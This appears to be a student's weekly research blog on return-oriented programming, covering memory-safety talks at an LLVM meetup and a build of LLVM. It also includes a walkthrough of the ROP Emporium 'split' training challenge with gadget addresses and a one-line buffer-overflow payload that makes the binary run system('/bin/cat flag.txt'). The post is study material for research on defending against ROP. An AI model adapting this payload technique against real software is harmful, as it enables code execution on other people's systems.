# Weeks Of 10/15 and 10/22 Research Update
Hello again. I've decided to combine my last two weeks of research, mainly because I had a relatively light week on the week of the 15th. This was the week of the LLVM Developers conference, so in many ways I guess I was still researching. Nonetheless, I combined the last two weeks together to produce a more substantial update. Outside of the LLVM conference, I played around with some more exploitable and started diving into clang's source code by building LLVM on my host machine

## LLVM Developer Meetup
I recently got the opportunity to attend the LLVM developer meetup. There I got the opportunity to attend various technical talks, interact with the community, and ask some prominent questions regarding my research project. 


<p align="center">
  <img src ="https://i.imgur.com/31pNYRj.png?1" />
</p>

I'll try to sum up some of the more important (and relevant things I learned) here. I was able to attend a talk about the future of C++ where Michael Wong discussed the future of the language, it's compilation, and what to prepare for with C++ 20. There was also an interactive tutorial which covered how to build a backend code generator for a RISC-V architecture. This may prove useful since I'm about to dive into the LLVM backend source in the following weeks. The most prevalent talk I attended was about C/C++ safety and preventing memory-based attacks (like ROP!). In this talk, Kostya mentioned that ~50% of high critical security bugs in Chrome and Android are memory safety bugs. Things like ROP attacks and buffer overflows remain ever prevalent in industry executables.

<p align="center">
  <img src ="https://i.imgur.com/7LRZSq9.jpg" />
</p>

He then goes on to describe a memory tagging technique that we can build right into the software. Essentially if a pointer points to a spot in memory you tag the stack entry and the spot in memory. For example, purpose assume you tag both with the letter A. Thus if the pointer is changed, it won't point to a memory address with an "A" tag, and the system will stop, throwing an exception. This is an interesting approach to memory safety and may be something to explore in the future. He mentioned that there is specific hardware that manufacturers are working on to help make this process easier. This talk actually lead to some interesting conversations with other people at the conference. Ultimately, I've learned that there are really two approaches to preventing ROP attacks: 
1.) We can make ROP gadgets harder to find, thus limiting the amount of code that can be exploited with "ease"
2.) We can implement some method to make manipulation harder once an attacker has access to the stack. This is the approach that Kostya discussed with his C/C++ memory safety talk.

For the purpose of this project, I'm going to focus on making gadgets harder to find. If time permits towards the end, I might be able to circle back and examine memory safety techniques we could implement in software. This would require a considerable amount of extra research I would assume.


## Yet Another Exploitable
I spent much of my time examining another exploitable file from [ROPEmpoium](https://ropemporium.com/guide.html). This time, the goal was to call an unintended function with a parameter. I wanted to call the [system()](http://www.cplusplus.com/reference/cstdlib/system/) function with the "/bin/cat flag.txt" argument. This requires significant manipulation of the stack as I found out. I'll spare you a tutorial this time, but if you're interested feel free to check out my last write up [here](https://github.com/justiceadamsUNI/ROP-research-documentation/blob/master/Week-of-10-1-update.md). Just like previously, there's too much being written to a buffer, thus we can use a buffer overflow as our point of entry. Consider the stack, what we want is to put the argument needed into the correct register, then call the system() function

```
|---------------------------|             |---------------------------------|
|       ............        |             |                                 |
|---------------------------|             |---------------------------------|
|       ............        |             |                                 |
|---------------------------|   -----\    |---------------------------------|
|       OTHER STUFF         |   -----/    |         System() address        |
|---------------------------|             |---------------------------------|
|       OTHER STUFF         |             | Address to String to use as arg |
|---------------------------|             |---------------------------------| 
| Return Address to Exploit |             | Adress to pop rdi; ret; gadget  |
-----------------------------             -----------------------------------
```
We use the `pop rdi; ret;` gadget to pop the String argument on the stack into the `%rdi` register, which will be used as a function parameter to the call to system().
```
"Additionally, %rdi, %rsi, %rdx %rcx, %r8, and %r9 are used to pass the first six integer
or pointer parameters to called functions" - CS Brown x64 cheatsheet
```
Now, we actually have to find those addresses. Using rare2d I was able to find the address of System() and I was able to analyze all variables loaded in memory and found an address for a string variable which has exactly what we want.

<p align="center">
  <img src ="https://i.imgur.com/VYRX8e8.png" />
</p>
Address of the `System()` call is `0x004005e0`

<p align="center">
  <img src ="https://i.imgur.com/xDJUeQf.png" />
</p>

Address of the string variable is `0x00601060`. The last thing to do is find the gadget we need. I used a tool called [ropper](https://github.com/sashs/Ropper) to do this part. It made it incredibly easy to actually find the gadgets, and I'll definitely be using this in the coming weeks.

<p align="center">
  <img src ="https://i.imgur.com/xR64Nsp.png" />
</p>

Using this tool, I was able to find that the address to the gadget is `0x00400883`!

Thus, putting this all together I'm able to write into the buffer using the same formula as last time: 
```
python -c 'print("X"*40 + "\x83\x08\x40\x00\x00\x00\x00\x00" + "\x60\x10\x60\x00\x00\x00\x00\x00" + "\xe0\x05\x40\x00\x00\x00\x00\x00")' | ./split1
```
And our result is what we expect! Note: This did not work on a windows machine using [WSL](https://docs.microsoft.com/en-us/windows/wsl/install-win10). I had to finish my hacking at work on a true Linux machine to get things to work. I'm going to stop doing these exercises due to the fact that they don't work on Windows. Also, I've pretty much learned everything I need so far. It's become much clearer how to use these gadgets after doing this exercise.

## Building LLVM
I also managed to build LLVM from the open source git branch using the visual studio 2017 compiler. Next week, I'm planning on diving into some back-end code. Someone from the conference told me that the [Kaladiescope](https://llvm.org/docs/tutorial/) tutorial might be a good place to start, but stay tuned.

## For Next Week
- Dive into the LLVM/clang back-end code and see where exactly assembly instructions are generated.
- Research techniques for preventing ROP gadgets from detectability (no-op instructions?)
- Use the ROP tools mentioned above to analyze some industry executables, maybe a game if I can get my hands on a sample.
- Check out the Kaleidoscope tutorial to see if there's anything of interest that could help there.

## Sources for this week
### Information sources:
- [PwnTools](https://github.com/Gallopsled/pwntools)
- [x86 Call/Return Protocol - University of Wisconsin](http://pages.cs.wisc.edu/~remzi/Classes/354/Fall2012/Handouts/Handout-CallReturn.pdf)
- [x64 Cheat Sheet - Brown University](https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf)
- [Ropper](https://github.com/sashs/Ropper)
- [Radare2 cheatsheet](https://gist.github.com/williballenthin/6857590dab3e2a6559d7)
- [Split challenge](https://ropemporium.com/challenge/split.html)
- [Abatchy Split Solution](https://github.com/abatchy17/ROP-Emporium/blob/master/split/split64.py)

### Image Sources
- https://twitter.com/llvmorg/status/1052634914657468416
